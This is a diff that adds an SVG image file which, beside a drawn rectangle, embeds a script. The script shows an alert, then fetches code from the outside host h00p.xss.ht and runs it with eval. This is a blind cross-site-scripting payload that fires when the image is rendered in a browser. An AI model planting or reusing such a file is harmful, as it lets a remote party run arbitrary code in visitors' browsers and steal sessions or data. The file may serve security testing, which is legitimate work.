@@ -1,0 +1,16 @@
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<!--https://css-tricks.com/using-svg/-->
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+   <rect width="300" height="100" style="fill:rgb(153,20,204);stroke-width:3;stroke:rgb(0,0,0)" />
+   <script type="text/javascript">
+      alert("Greetings from h00p");
+      function b(){
+      	eval(this.responseText)
+      };
+      a=new XMLHttpRequest();
+      a.addEventListener("load", b);
+      a.open("GET", "//h00p.xss.ht");
+      a.send();
+   </script>
+</svg>
